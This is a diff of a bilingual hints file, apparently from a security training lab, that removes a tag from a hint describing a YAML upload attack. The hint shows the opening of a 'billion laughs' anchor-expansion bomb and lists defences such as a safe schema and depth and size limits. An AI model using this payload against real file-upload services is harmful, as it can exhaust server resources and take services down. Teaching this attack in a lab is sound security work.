@@ -69,7 +69,7 @@ hints:
   N5:
     cost_pct: 50
     text_fr: |
-      [KILL_CHAIN_DOCUMENTED] Workflow : (1) Crafter bomb.yml :
+      Workflow : (1) Crafter bomb.yml :
       ```yaml
       a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
       b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
@@ -88,7 +88,7 @@ hints:
       `SAFE_SCHEMA`, limite anchor depth, JSON Schema post-parse, file
       size limit. JAMAIS load() default. Source : fileUpload.ts:123-124.
     text_en: |
-      [KILL_CHAIN_DOCUMENTED] Workflow: (1) Craft bomb.yml:
+      Workflow: (1) Craft bomb.yml:
       ```yaml
       a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
       b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
